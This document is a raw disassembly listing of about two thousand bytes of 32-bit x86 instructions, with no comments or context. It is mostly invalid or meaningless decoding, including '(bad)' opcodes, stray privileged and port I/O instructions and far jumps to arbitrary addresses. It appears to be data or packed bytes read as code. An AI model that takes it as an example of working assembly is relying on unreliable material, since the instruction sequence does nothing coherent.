  443668:	enter  0x9563,0x1b
  44366c:	mov    eax,ds:0x9f13cdf0
  443671:	mov    cl,0x85
  443673:	mov    dh,0x7e
  443675:	pop    ebx
  443676:	or     eax,0x966fc885
  44367b:	dec    edi
  44367c:	mov    bl,ah
  44367e:	add    DWORD PTR [edi],ecx
  443680:	dec    edi
  443681:	sbb    al,0x19
  443683:	sub    eax,0x87947a59
  443688:	clc    
  443689:	xchg   ecx,eax
  44368a:	or     eax,0x61e40900
  44368f:	adc    DWORD PTR [eax+0x13bcc65b],edx
  443695:	mov    ds:0xe4777c15,eax
  44369a:	mov    ebp,0x19240b07
  44369f:	xchg   BYTE PTR [eax],ch
  4436a1:	add    al,0x1c
  4436a3:	add    BYTE PTR [eax-0x70f9fe2d],dl
  4436a9:	mov    cl,0x7d
  4436ab:	mov    dh,0x9e
  4436ad:	pop    ebx
  4436ae:	or     eax,0x8e8f50f9
  4436b3:	jg     0x4436d9
  4436b5:	mov    cl,BYTE PTR ds:0x59b2d800
  4436bb:	jge    0x4436c4
  4436bd:	sub    esp,ecx
  4436bf:	add    edx,DWORD PTR [eax-0x24bf4af3]
  4436c5:	jle    0x443652
  4436c7:	inc    eax
  4436c8:	retf   
  4436c9:	jle    0x44366e
  4436cb:	inc    eax
  4436cc:	add    BYTE PTR [eax],al
  4436ce:	add    BYTE PTR [eax],al
  4436d0:	add    bl,cl
  4436d2:	jle    0x44368f
  4436d4:	inc    eax
  4436d5:	fstp   TBYTE PTR [esi+0x6c]
  4436d8:	jl     0x4436c5
  4436da:	enter  0x3f7,0x4d
  4436de:	xor    eax,0x9419fcae
  4436e3:	clc    
  4436e4:	jns    0x44370d
  4436e6:	sub    ch,cl
  4436e8:	add    edx,DWORD PTR [eax+0x1518273d]
  4436ee:	cli    
  4436ef:	fistp  QWORD PTR [ebx-0x65]
  4436f2:	ret    
  4436f3:	push   0x2f3d83c4
  4436f8:	sbb    BYTE PTR ds:0x2202f002,cl
  4436fe:	dec    edx
  4436ff:	scas   al,BYTE PTR es:[edi]
  443700:	sbb    dl,BYTE PTR [eax+0x13143cb2]
  443706:	jnp    0x4436c9
  443708:	adc    eax,0x7eeffa0d
  44370d:	iret   
  44370e:	(bad)  
  44370f:	pop    ebp
  443710:	mov    edi,?
  443712:	(bad)  
  443713:	test   DWORD PTR [ebx],0x32c6ce18
  443719:	addr16 (bad) 
  44371b:	in     al,0x3c
  44371d:	mov    cl,0x3b
  44371f:	pop    edi
  443720:	ins    BYTE PTR es:[edi],dx
  443721:	xor    DWORD PTR [edx+0x2e177cf7],0xd9003e9
  44372b:	xor    eax,0x237dcb40
  443730:	inc    eax
  443731:	retf   
  443732:	jge    0x44376f
  443734:	inc    eax
  443735:	add    BYTE PTR [eax],al
  443737:	add    BYTE PTR [eax],al
  443739:	add    bl,bl
  44373b:	jge    0x44374b
  44373d:	pushf  
  44373e:	pop    bp
  443740:	cmp    eax,0x95885e97
  443745:	fstp   TBYTE PTR [ebx+0x3f]
  443748:	jmp    0x6c32ba2b
  44374d:	loope  0x4436e2
  44374f:	out    0x4c,al
  443751:	(bad)  
  443752:	sti    
  443753:	les    edx,FWORD PTR [ebp+0xa38b419]
  443759:	fsub   DWORD PTR [edx-0x4f]
  44375c:	add    ah,BYTE PTR [edx-0x3d]
  44375f:	mov    eax,0xc4eb6241
  443764:	xchg   ebp,eax
  443765:	mov    dl,0x4c
  443767:	pop    eax
  443768:	push   ss
  443769:	jno    0x4436fa
  44376b:	ret    
  44376c:	jmp    0x6679df9a
  443771:	cmc    
  443772:	(bad)  
  443773:	call   DWORD PTR [esi]
  443775:	jae    0x44372d
  443777:	popa   
  443778:	mov    edi,0xe9c36f71
  44377d:	sub    DWORD PTR [eax-0x212a99cb],ecx
  443783:	call   DWORD PTR [esi]
  443785:	jb     0x44371d
  443787:	bound  edi,QWORD PTR [edi-0x694853d8]
  44378d:	in     eax,0xaa
  44378f:	imul   ecx,DWORD PTR [esi-0xb],0xbdc53562
  443796:	xor    edi,DWORD PTR ds:0xb293e985
  44379c:	push   cs
  44379d:	bound  eax,QWORD PTR [eax]
  44379f:	add    BYTE PTR [eax],al
  4437a1:	add    BYTE PTR [eax],al
  4437a3:	jmp    0x443768
  4437a5:	xchg   ebp,eax
  4437a6:	cdq    
  4437a7:	sbb    esi,edi
  4437a9:	xchg   edi,eax
  4437aa:	les    ebx,FWORD PTR [ebx]
  4437ac:	or     BYTE PTR ss:[ecx-0x61],dh
  4437b0:	mov    edi,0x6b0bb495
  4437b5:	dec    esi
  4437b6:	cmc    
  4437b7:	leave  
  4437b8:	xor    al,0xc5
  4437ba:	add    BYTE PTR [ecx+ebx*4+0x47],dh
  4437be:	pop    ebx
  4437bf:	or     al,0xf9
  4437c1:	aad    0xcc
  4437c3:	add    al,0xf1
  4437c5:	cmc    
  4437c6:	mov    eax,DWORD PTR [esp+ebp*2]
  4437c9:	xchg   esp,eax
  4437ca:	adc    BYTE PTR [ebp-0x4a],0xe
  4437ce:	add    BYTE PTR [eax+esi*8],bh
  4437d1:	xchg   ecx,eax
  4437d2:	or     DWORD PTR [ecx-0x3e7d6e4d],edi
  4437d8:	outs   dx,BYTE PTR ds:[esi]
  4437d9:	jmp    0x2e3478dd
  4437de:	or     edi,DWORD PTR [ecx+0x2cc93bb3]
  4437e4:	cmp    BYTE PTR [ebp+0xa],ah
  4437e7:	test   eax,0xc982cfb3
  4437ec:	outs   dx,BYTE PTR ds:[esi]
  4437ed:	jmp    0x4d57b1f1
  4437f2:	add    BYTE PTR [esi],dh
  4437f4:	cmp    BYTE PTR ds:0x2b3690b,dh
  4437fa:	pusha  
  4437fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4437fc:	mov    dh,0x91
  4437fe:	sub    BYTE PTR [ecx],0x6e
  443801:	jmp    0x217c6f05
  443806:	or     eax,DWORD PTR [eax]
  443808:	add    BYTE PTR [eax],al
  44380a:	add    BYTE PTR [eax],al
  44380c:	imul   esi,DWORD PTR [ebx-0x4cda9fca],0xdec3896c
  443816:	(bad)  
  443817:	(bad)  
  443818:	cmp    esp,ebp
  44381a:	xchg   ebx,eax
  44381b:	mov    esp,0x5d0eb347
  443820:	loopne 0x443817
  443822:	hlt    
  443823:	jmp    FWORD PTR [esi-0xe]
  443826:	aad    0xcc
  443828:	add    al,0xee
  44382a:	cmc    
  44382b:	sbb    DWORD PTR [ebp+0x56],0x3f
  44382f:	(bad)  
  443830:	hlt    
  443831:	xchg   esp,eax
  443832:	cmp    cl,cl
  443834:	jno    0x4437e9
  443836:	push   cs
  443837:	add    BYTE PTR [eax+0xdd1ca59],dl
  44383d:	test   ebx,edx
  44383f:	popa   
  443840:	or     ebp,ebp
  443842:	loopne 0x443823
  443844:	jbe    0x4438a2
  443846:	sbb    al,0x61
  443848:	xchg   ebx,eax
  443849:	outs   dx,DWORD PTR ds:[esi]
  44384a:	push   cs
  44384b:	mov    cl,0xce
  44384d:	ss fs dec ebx
  443850:	dec    ebp
  443851:	jns    0x443820
  443853:	jl     0x44381d
  443855:	pop    edi
  443856:	lahf   
  443857:	jecxz  0x4437dc
  443859:	(bad)  
  44385a:	nop
  44385b:	aam    0x38
  44385d:	mov    ch,0xf
  44385f:	mov    cl,0x5c
  443861:	lock adc eax,DWORD PTR [ebx+0x904a4c2]
  443868:	fistp  WORD PTR [ecx+eax*8-0x32eef421]
  44386f:	popa   
  443870:	add    BYTE PTR [eax],al
  443872:	add    BYTE PTR [eax],al
  443874:	add    BYTE PTR [ecx],cl
  443876:	popf   
  443877:	rcr    edi,0x78
  44387a:	sub    al,0x38
  44387c:	clc    
  44387d:	xchg   DWORD PTR [esi-0x69b8fc9b],edi
  443883:	sti    
  443884:	in     al,dx
  443885:	not    BYTE PTR [edi]
  443887:	mov    edi,0x53cf7584
  44388c:	retf   
  44388d:	push   esp
  44388e:	iret   
  44388f:	imul   ebp,ebx,0x13
  443892:	lock in eax,0x84
  443895:	int    0x63
  443897:	ret    0x1b50
  44389a:	xchg   esp,eax
  44389b:	imul   edi,DWORD PTR [edi],0xffffff98
  44389e:	sar    BYTE PTR [ebp-0x6d9bf4f5],1
  4438a4:	(bad)  
  4438a5:	aaa    
  4438a6:	imul   ecx,DWORD PTR [ebp-0x7a],0x4a64f3c5
  4438ad:	and    al,0x9d
  4438af:	xchg   edi,eax
  4438b0:	dec    edi
  4438b1:	test   BYTE PTR [ebx+0xd],bl
  4438b4:	add    BYTE PTR [eax-0x2efc084e],dl
  4438ba:	xor    al,0xa3
  4438bc:	pop    ss
  4438bd:	nop
  4438be:	mov    dl,0xc2
  4438c0:	add    eax,0x5572b290
  4438c5:	jns    0x44386b
  4438c7:	cdq    
  4438c8:	test   BYTE PTR [ebx-0x7a4808cb],ch
  4438ce:	ins    DWORD PTR es:[edi],dx
  4438cf:	jns    0x4438a4
  4438d1:	xor    DWORD PTR [edx+0x3017cf7],0xffffffec
  4438d8:	add    eax,DWORD PTR [eax]
  4438da:	add    BYTE PTR [eax],al
  4438dc:	add    BYTE PTR [eax],al
  4438de:	nop
  4438df:	cmp    esi,DWORD PTR [ebx-0x6a]
  4438e2:	imul   edi,DWORD PTR [ecx-0x7e8fc09],0xffffffdb
  4438e9:	inc    esi
  4438ea:	adc    esp,DWORD PTR [ebx-0x4d6fe7d1]
  4438f0:	idiv   DWORD PTR [edx-0x31]
  4438f3:	pop    ecx
  4438f4:	clc    
  4438f5:	repnz int 0xd4
  4438f8:	outs   dx,BYTE PTR ds:[esi]
  4438f9:	fcom   DWORD PTR [eax]
  4438fb:	mov    cl,0x37
  4438fd:	jmp    0x4438d1
  4438ff:	push   0xb
  443901:	cmp    al,BYTE PTR [ebp*1-0x4d6fe7d9]
  443908:	cmc    
  443909:	mov    al,0xc6
  44390b:	xor    DWORD PTR [esi+0x36b7eb02],ecx
  443911:	jnp    0x443939
  443913:	pop    ecx
  443914:	cmc    
  443915:	repnz pop ds
  443917:	ins    DWORD PTR es:[edi],dx
  443918:	jno    0x4438ee
  44391a:	xor    DWORD PTR [edx+0x2217af7],0xffffffe4
  443921:	add    edx,DWORD PTR [eax-0x246984c5]
  443927:	mov    ecx,0xb2fe03f7
  44392c:	test   DWORD PTR [ebx],0x185ed490
  443932:	adc    DWORD PTR [esi+ecx*1+0x6d],esi
  443936:	xchg   esi,eax
  443937:	or     al,BYTE PTR [ebx]
  443939:	jmp    0x782debd1
  44393e:	ins    BYTE PTR es:[edi],dx
  44393f:	ret    
  443940:	push   cs
  443941:	jmp    0x443946
  443946:	add    BYTE PTR [eax],bl
  443948:	xchg   BYTE PTR [edx-0x1e],ah
  44394b:	(bad)  
  44394c:	and    DWORD PTR [edx+0x6a],edx
  44394f:	xchg   edx,eax
  443950:	xchg   ebp,eax
  443951:	nop
  443952:	push   ebp
  443953:	xchg   BYTE PTR [edx-0x28995f2],dh
  443959:	add    ch,cl
  44395b:	xchg   ebx,eax
  44395c:	ins    BYTE PTR es:[edi],dx
  44395d:	cmp    edx,DWORD PTR gs:[ebp-0x8]
  443961:	jmp    0x9833:0x97b4e872
  443968:	aaa    
  443969:	nop
  44396a:	cmp    DWORD PTR [eax-0x258ff14e],ebx
  443970:	cs xchg ebp,eax
  443972:	mov    eax,ds:0xc28d6644
  443977:	mov    esi,gs
  443979:	call   FWORD PTR [ecx]
  44397b:	sbb    esi,DWORD PTR [ebx-0xa]
  44397e:	mov    cl,0x77
  443980:	push   0xffffffe9
  443982:	xor    dl,BYTE PTR [ebx]
  443984:	jo     0x443998
  443986:	push   0xffffffba
  443988:	ins    BYTE PTR es:[edi],dx
  443989:	push   0xffffff86
  44398b:	cli    
  44398c:	lock out 0x60,al
  44398f:	dec    eax
  443990:	fs cmc 
  443992:	out    dx,al
  443993:	adc    BYTE PTR [eax],dl
  443995:	xor    ch,cl
  443997:	xchg   ebx,eax
  443998:	mov    dl,0xe
  44399a:	bound  edx,QWORD PTR ds:0x93e902fc
  4439a0:	xor    eax,0xb75f6f9a
  4439a5:	push   cs
  4439a6:	jmp    0xe2b28375
  4439ab:	add    BYTE PTR [eax],al
  4439ad:	add    BYTE PTR [eax],al
  4439af:	add    BYTE PTR [ebx+0xd6056b2],dl
  4439b5:	cld    
  4439b6:	add    al,BYTE PTR [eax]
  4439b8:	cmp    DWORD PTR [eax-0xa5dfe90],esi
  4439be:	nop
  4439bf:	mov    cs,WORD PTR [ecx+0x69]
  4439c2:	jmp    0xf6290bc6
  4439c7:	push   DWORD PTR [esi+0x2608fe8]
  4439cd:	mov    al,0xe
  4439cf:	xor    DWORD PTR [ebx+0x3d95e89c],0xffffffc4
  4439d6:	push   cs
  4439d7:	add    BYTE PTR [edx-0x13],ah
  4439da:	cmp    eax,0x91aff914
  4439df:	pushf  
  4439e0:	ja     0x443a5d
  4439e2:	adc    al,BYTE PTR [eax]
  4439e4:	jmp    0xcd98b69f
  4439e9:	scas   eax,DWORD PTR es:[edi]
  4439ea:	push   cs
  4439eb:	mov    esi,DWORD PTR [edi]
  4439ed:	mov    bh,ch
  4439ef:	jmp    FWORD PTR [ecx+0x658e8de8]
  4439f5:	imul   ebp,ecx,0xfde95fff
  4439fb:	xchg   BYTE PTR [edi-0x4f],cl
  4439fe:	add    bl,BYTE PTR [edi+0x66e12b32]
  443a04:	xor    dl,cl
  443a06:	xchg   edi,eax
  443a07:	mov    cl,BYTE PTR ds:0x791446bd
  443a0d:	scas   eax,DWORD PTR es:[edi]
  443a0e:	nop
  443a0f:	mov    WORD PTR [edi+0x77],gs
  443a12:	std    
  443a13:	inc    DWORD PTR [eax]
  443a15:	add    BYTE PTR [eax],al
  443a17:	add    BYTE PTR [eax],al
  443a19:	imul   esi,DWORD PTR [edx],0x5304cd
  443a1f:	pop    ss
  443a20:	mov    dh,0xb
  443a22:	and    edx,ebp
  443a24:	push   cs
  443a25:	lahf   
  443a26:	call   DWORD PTR [edx-0x54631eb3]
  443a2c:	mov    ch,cl
  443a2e:	ins    BYTE PTR es:[edi],dx
  443a2f:	inc    ecx
  443a30:	adc    al,0x39
  443a32:	scas   eax,DWORD PTR es:[edi]
  443a33:	pop    ss
  443a34:	mov    bh,0x90
  443a36:	stos   BYTE PTR es:[edi],al
  443a37:	mov    al,0x86
  443a39:	(bad)  
  443a3b:	or     al,0x62
  443a3d:	sbb    DWORD PTR [ebp-0x66],ecx
  443a40:	std    
  443a41:	sbb    bl,bl
  443a43:	mov    dl,0x4
  443a45:	nop
  443a46:	pop    ecx
  443a47:	int3   
  443a48:	gs xchg ecx,eax
  443a4a:	rcl    BYTE PTR [eax-0x7a],1
  443a4d:	pop    ebp
  443a4e:	xchg   ecx,eax
  443a4f:	or     ch,BYTE PTR ds:0x7c3bcbf4
  443a55:	aam    0x5c
  443a57:	mov    ?,WORD PTR [ecx+0xd6560]
  443a5d:	xchg   edx,eax
  443a5e:	fs push 0x3a6be73d
  443a64:	clc    
  443a65:	push   cs
  443a66:	dec    ebp
  443a67:	add    DWORD PTR [eax],eax
  443a69:	nop
  443a6a:	rcl    BYTE PTR [eax+0xd59a453],1
  443a70:	test   DWORD PTR [esi],ebx
  443a72:	stc    
  443a73:	out    0xff,eax
  443a75:	mov    edi,0x907a8cf
  443a7a:	in     eax,0x93
  443a7c:	pop    ebx
  443a7d:	add    BYTE PTR [eax],al
  443a7f:	add    BYTE PTR [eax],al
  443a81:	add    BYTE PTR [ebx-0x317af2a7],bl
  443a87:	sbb    BYTE PTR [edx-0x15],0x9f
  443a8b:	and    esp,DWORD PTR [esi+0x5a]
  443a8e:	xchg   esp,eax
  443a8f:	or     eax,0x5b9b3b84
  443a94:	or     eax,0x3a4741e8
  443a99:	clc    
  443a9a:	fbld   TBYTE PTR [edi+eiz*2+0x291cd5e2]
  443aa1:	retf   
  443aa2:	pop    esp
  443aa3:	and    BYTE PTR [ecx],ch
  443aa5:	retf   
  443aa6:	push   esp
  443aa7:	sbb    BYTE PTR [ecx],ch
  443aa9:	retf   
  443aaa:	dec    esp
  443aab:	retf   0xef67
  443aae:	or     edx,edx
  443ab0:	sbb    DWORD PTR ds:0x7ef7b290,eax
  443ab6:	sbb    DWORD PTR [edi],edi
  443ab8:	test   DWORD PTR [ebx],0x58500090
  443abe:	sub    DWORD PTR [edx+0x58],ebp
  443ac1:	js     0x443ad4
  443ac3:	fadd   QWORD PTR [ebx]
  443ac6:	nop
  443ac7:	aaa    
  443ac8:	jns    0x443b45
  443aca:	xchg   esi,eax
  443acb:	mov    dl,0xf7
  443acd:	aad    0x2f
  443acf:	dec    esp
  443ad0:	sub    DWORD PTR [eax+ecx*1],ebp
  443ad3:	cmp    BYTE PTR [ecx-0xd],bh
  443ad6:	mov    WORD PTR [edx+0x77f7d3f7],?
  443adc:	add    ch,BYTE PTR [eax+edi*8]
  443adf:	xor    eax,0xc527ff33
  443ae4:	test   DWORD PTR [ebx],0x0
  443aea:	add    BYTE PTR [eax+0x567ef45d],dl
  443af0:	mov    dl,0xf0
  443af2:	jne    0x443b03
  443af4:	not    esp
  443af6:	ret    
  443af7:	iret   
  443af8:	iret   
  443af9:	je     0x443b63
  443afb:	sbb    ecx,ebp
  443afd:	fld    QWORD PTR [ebx]
  443aff:	nop
  443b00:	mov    dl,0x4a
  443b02:	popf   
  443b03:	mov    BYTE PTR [eax],ah
  443b05:	addr16 mov edi,0xa1f7f28c
  443b0b:	and    al,0x26
  443b0d:	inc    ecx
  443b0e:	stos   BYTE PTR es:[edi],al
  443b0f:	xchg   ebp,eax
  443b10:	mov    dl,0xf7
  443b12:	add    esp,DWORD PTR [ebx]
  443b14:	stos   BYTE PTR es:[edi],al
  443b15:	enter  0x1771,0xfc
  443b19:	aam    0xc3
  443b1b:	xchg   edi,ecx
  443b1d:	je     0x443b87
  443b1f:	or     eax,ebp
  443b21:	in     eax,dx
  443b22:	add    edx,DWORD PTR [eax-0x6708fd4e]
  443b28:	and    BYTE PTR [edi-0x43],al
  443b2b:	test   dl,dh
  443b2d:	mul    DWORD PTR [ecx+0x5f0e26dc]
  443b33:	sub    ch,BYTE PTR [edi-0x1a6c16f2]
  443b39:	push   ds
  443b3a:	push   0xffffffa4
  443b3c:	mov    ch,0x8d
  443b3e:	popa   
  443b3f:	xchg   edi,eax
  443b40:	in     eax,dx
  443b41:	sahf   
  443b42:	fs clc 
  443b44:	test   al,0xff
  443b46:	out    0xa9,eax
  443b48:	adc    DWORD PTR [eax],eax
  443b4a:	jmp    0xb21247e2
  443b4f:	add    BYTE PTR [eax],al
  443b51:	add    BYTE PTR [eax],al
  443b53:	add    BYTE PTR [eax-0x7327b103],bl
  443b59:	cmp    al,0xb6
  443b5b:	xlat   BYTE PTR ds:[ebx]
  443b5c:	xchg   ebx,eax
  443b5d:	mov    dl,0x48
  443b5f:	sub    cl,BYTE PTR [edi]
  443b61:	push   ecx
  443b62:	or     al,0x6c
  443b64:	cmp    BYTE PTR [ecx+0x1179e7ff],ch
  443b6a:	add    cl,ch
  443b6c:	xchg   ebx,eax
  443b6d:	or     al,0xce
  443b6f:	push   0xffffff84
  443b71:	call   0xfb7:0xd3ad
  443b77:	addr16 xor al,0xc3
  443b7a:	push   cs
  443b7b:	jmp    0xb61e6159
  443b80:	jg     0x443bff
  443b82:	fisubr DWORD PTR [ebp+0x3cda7d87]
  443b88:	aaa    
  443b89:	pop    ebp
  443b8a:	xchg   ebp,eax
  443b8b:	and    al,0xac
  443b8d:	sub    eax,0xb2818596
  443b92:	push   cs
  443b93:	push   0x6c
  443b95:	mov    esp,0x2bf4068
  443b9a:	xchg   esi,eax
  443b9b:	xor    al,0xa0
  443b9d:	aam    0x95
  443b9f:	mov    edi,0x72ec7731
  443ba4:	cmp    esi,DWORD PTR [eax+0x2023e070]
  443baa:	add    cl,ch
  443bac:	xchg   ebx,eax
  443bad:	mov    ecx,0xdbf100a0
  443bb2:	(bad)  
  443bb3:	jmp    FWORD PTR [ecx-0x17]
  443bb6:	pop    ecx
  443bb7:	adc    al,0x0
  443bb9:	add    BYTE PTR [eax],al
  443bbb:	add    BYTE PTR [eax],al
  443bbd:	icebp  
  443bbe:	scas   eax,DWORD PTR es:[edi]
  443bbf:	sbb    DWORD PTR [edi],ecx
  443bc1:	xchg   DWORD PTR [ebx],edi
  443bc3:	mov    al,ds:0xe7b43916
  443bc8:	inc    eax
  443bc9:	inc    ebp
  443bca:	jmp    0x83f65020
  443bcf:	adc    DWORD PTR [eax-0x6f6c40c3],ecx
  443bd5:	or     eax,0x5e000ec2
  443bda:	jae    0x443bd9
  443bdc:	mov    al,0x39
  443bde:	xchg   bl,dl
  443be0:	data16 stos BYTE PTR es:[edi],al
  443be2:	leave  
  443be3:	xchg   edx,eax
  443be4:	dec    ebp
  443be5:	or     DWORD PTR [ecx],esi
  443be7:	stos   DWORD PTR es:[edi],eax
  443be8:	repz add BYTE PTR [ebx-0x5b],0x16
  443bed:	jmp    0xcd99cfa5
  443bf2:	adc    DWORD PTR [eax+0xec151b0],edx
  443bf8:	add    bh,bh
  443bfa:	js     0x443c6f
  443bfc:	add    DWORD PTR [ecx-0x41001de8],edx
  443c02:	sub    eax,0xed4c04cd
  443c07:	outs   dx,DWORD PTR ds:[esi]
  443c08:	mov    eax,DWORD PTR [edx+eax*8+0x2dcbd36c]
  443c0f:	test   al,0x3
  443c11:	xor    dh,ah
  443c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443c14:	push   ss
  443c15:	mov    ecx,0xb94d93b3
  443c1a:	adc    DWORD PTR [eax],edx
  443c1c:	nop
  443c1d:	and    esp,eax
  443c1f:	push   cs
  443c20:	add    BYTE PTR [eax],al
  443c22:	add    BYTE PTR [eax],al
  443c24:	add    BYTE PTR [eax],al
  443c26:	bnd ja 0x443c3e
  443c29:	push   0x78
  443c2b:	retf   
  443c2c:	pop    ebx
  443c2d:	sti    
  443c2e:	push   ds
  443c2f:	cdq    
  443c30:	push   0xffffffc4
  443c32:	nop
  443c33:	push   ebp
  443c34:	sar    BYTE PTR [esp+ebx*2+0x54cb2645],1
  443c3b:	sbb    eax,0x154ccb26
  443c40:	es retf 
  443c42:	inc    esp
  443c43:	(bad)  
  443c44:	imul   ebp,ebx,0x1b
  443c47:	mov    gs,edx
  443c49:	pop    edx
  443c4a:	cmp    DWORD PTR ds:0x953ff83b,esp
  443c50:	es retf 
  443c52:	inc    esp
  443c53:	es push 0xffffffeb
  443c56:	sbb    ecx,DWORD PTR [esi]
  443c58:	in     eax,0x84
  443c5a:	sbb    BYTE PTR ds:0x3390fffc,ch
  443c60:	adc    BYTE PTR [eax],al
  443c62:	nop
  443c63:	pop    ecx
  443c64:	scas   eax,DWORD PTR es:[edi]
  443c65:	int3   
  443c66:	repnz dec ebx
  443c68:	mov    edi,0xd5991b9
  443c6d:	add    BYTE PTR [esi+0x62],dh
  443c70:	jge    0x443c29
  443c72:	sahf   
  443c73:	pop    ecx
  443c74:	or     eax,0xb785e97d
  443c79:	dec    ebx
  443c7a:	xchg   edi,eax
  443c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443c7c:	call   0x4085:0xd5986b7
  443c83:	test   DWORD PTR [edx+0x47],ebp
  443c86:	cwde   
  443c87:	rcl    DWORD PTR [esi],1
  443c89:	sldt   WORD PTR [eax]
  443c8c:	add    BYTE PTR [eax],al
  443c8e:	add    BYTE PTR [ecx+0x608ff09],dl
  443c94:	xor    DWORD PTR [ecx+edx*1-0x70],esi
  443c98:	pop    ecx
  443c99:	push   0x47
  443c9b:	test   ah,dl
  443c9d:	mov    ebp,0xfc4d1807
  443ca2:	test   BYTE PTR [eax],al
  443ca4:	in     eax,0xff
  443ca6:	call   DWORD PTR [eax-0x18ec62a6]
  443cac:	jmp    0x570:0xb35a25fd
  443cb3:	nop
  443cb4:	mov    dl,0xf7
  443cb6:	mov    eax,ds:0x45745644
  443cbb:	jl     0x443cf9
  443cbd:	addr16 xor DWORD PTR [bp+si-0x5e09],0x114f2b16
  443cc7:	nop
  443cc8:	mov    dl,0x0
  443cca:	sbb    eax,0x4b63196
  443ccf:	(bad)  
  443cd1:	mov    bl,0x11
  443cd3:	nop
  443cd4:	mov    dl,0x5c
  443cd6:	jnp    0x443cd3
  443cd8:	mov    esp,0x807d03f7
  443cdd:	rcl    DWORD PTR [ebp+eax*2-0x33],1
  443ce1:	ficom  WORD PTR [ebx+0x3f7bce7]
  443ce7:	xchg   ebp,eax
  443ce8:	imul   ebp,esi,0xffffffa9
  443ceb:	pop    edx
  443cec:	mov    ch,0x61
  443cee:	mov    edi,DWORD PTR [edi]
  443cf0:	mov    ebp,0x3f7
  443cf5:	add    BYTE PTR [eax],al
  443cf7:	add    BYTE PTR ds:0x4f7ce403,dl
  443cfd:	mov    edx,0xb39f076f
  443d02:	xchg   DWORD PTR [edi],ecx
  443d04:	cdq    
  443d05:	sbb    al,0x6f
  443d07:	push   0xffffff81
  443d09:	mov    dl,0xf7
  443d0b:	jl     0x443d5c
  443d0d:	mov    esi,0x3a97d36c
  443d12:	fist   DWORD PTR [edx]
  443d14:	(bad)  
  443d15:	aad    0xeb
  443d17:	jp     0x443d28
  443d19:	daa    
  443d1a:	loope  0x443d1f
  443d1c:	nop
  443d1d:	and    esp,edi
  443d1f:	repnz mov eax,ds:0xd49ead98
  443d25:	push   esp
  443d26:	je     0x443d6a
  443d28:	mov    al,ds:0x8168473b
  443d2d:	mov    dl,0xe
  443d2f:	jmp    0x71e26961
  443d34:	xchg   esi,eax
  443d35:	mov    dl,0xe
  443d37:	inc    edi
  443d38:	dec    ebx
  443d39:	or     al,bh
  443d3b:	sbb    DWORD PTR [ebp-0x2a951696],esp
  443d41:	mov    dl,0x48
  443d43:	pusha  
  443d44:	in     al,0x29
  443d46:	add    cl,ch
  443d48:	xchg   ebx,eax
  443d49:	dec    DWORD PTR [ebx-0x70]
  443d4c:	dec    edi
  443d4d:	pop    esp
  443d4e:	jmp    0xdabdc5c9
  443d53:	popf   
  443d54:	mov    BYTE PTR [ecx-0x26],bh
  443d57:	xor    eax,0x2dda7978
  443d5c:	add    BYTE PTR [eax],al
  443d5e:	add    BYTE PTR [eax],al
  443d60:	add    BYTE PTR [eax+0x79],bh
  443d63:	fidivr DWORD PTR [edx+ebp*4-0x5545c0a7]
  443d6a:	or     bh,bh
  443d6c:	sahf   
  443d6d:	call   0xe31:0xae6a16e0
  443d74:	jmp    0x2685f00c
  443d79:	shr    DWORD PTR [eax+0xe],1
  443d7c:	jmp    0xbaacf014
  443d81:	jp     0x443d2e
  443d83:	lea    edx,[esi-0x1e9d9939]
  443d89:	mov    eax,DWORD PTR [ebx-0x1a]
  443d8c:	push   es
  443d8d:	mov    bh,0x2c
  443d8f:	push   ecx
  443d90:	int    0x58
  443d92:	xor    eax,DWORD PTR [esi]
  443d94:	loop   0x443d29
  443d96:	mov    dl,0x3e
  443d98:	add    DWORD PTR [edi+0x38e6e95d],esi
  443d9e:	cmp    esi,DWORD PTR [edx]
  443da0:	repnz xchg ebx,eax
  443da2:	mov    dl,0x3f
  443da4:	ror    edx,0x5d
  443da7:	jmp    0x16b5507a
  443dac:	add    BYTE PTR [edx],ah
  443dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443daf:	icebp  
  443db0:	and    esp,edx
  443db2:	mov    esp,esi
  443db4:	mov    ebp,edi
  443db6:	pop    es
  443db7:	add    BYTE PTR [eax],al
  443db9:	jns    0x443da4
  443dbb:	xchg   edi,eax
  443dbc:	lods   al,BYTE PTR ds:[esi]
  443dbd:	jg     0x443d6f
  443dbf:	push   cs
  443dc0:	sub    DWORD PTR [ebx],0x6a
  443dc3:	push   0xffffffc1
  443dc5:	add    BYTE PTR [eax],al
  443dc7:	add    BYTE PTR [eax],al
  443dc9:	add    BYTE PTR [ebx-0x11],dh
  443dcc:	repz add edi,DWORD PTR [eax]
  443dcf:	(bad)  
  443dd0:	jmp    0x5eca:0x229aac88
  443dd7:	repnz add esi,DWORD PTR gs:[eax+ebp*1-0x14d774f4]
  443de0:	sub    al,BYTE PTR [edx+esi*2]
  443de3:	lock pop esi
  443de5:	sbb    eax,edx
  443de7:	jb     0x443dfe
  443de9:	test   DWORD PTR [ecx+0x13],edi
  443dec:	std    
  443ded:	mov    dl,BYTE PTR [esp+esi*4+0x3f]
  443df1:	push   ebx
  443df2:	stc    
  443df3:	jne    0x443de6
  443df5:	mov    cl,0x54
  443df7:	mov    esi,fs
  443df9:	cmp    DWORD PTR [ebp-0x7b30e41],0xffffffaf
  443e00:	push   cs
  443e01:	xor    DWORD PTR [edi-0x19],0xffffffe9
  443e05:	(bad)  
  443e06:	jmp    0x4cc8546e
  443e0b:	scas   eax,DWORD PTR es:[edi]
  443e0c:	push   cs
  443e0d:	add    dl,al
  443e0f:	test   eax,0xaf448416
  443e14:	push   cs
  443e15:	add    BYTE PTR [edx-0x23],ah
  443e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443e19:	push   ss
  443e1a:	mov    ecx,0xdd7d93af
  443e1f:	jmp    0x7e14:0x972a043e
  443e26:	jnp    0x443e6c
  443e28:	xchg   edx,eax
  443e29:	ret    0xf390
  443e2c:	aas    
  443e2d:	fild   WORD PTR [eax]
  443e2f:	add    BYTE PTR [eax],al
  443e31:	add    BYTE PTR [eax],al
  443e33:	sbb    eax,esp
  443e35:	(bad)  
  443e36:	popa   
  443e37:	mov    ebx,edx
  443e39:	jp     0x443e4c
  443e3b:	nop
  443e3c:	pop    ecx
  443e3d:	loop   0x443df0
  443e3f:	cs loope 0x443e5a
  443e42:	add    BYTE PTR [eax+0x807a8d0],dl
  443e48:	lods   eax,DWORD PTR ds:[esi]
  443e49:	or     eax,0xe25dcef9
  443e4e:	mov    cl,0xe
  443e50:	add    bl,BYTE PTR [ecx]
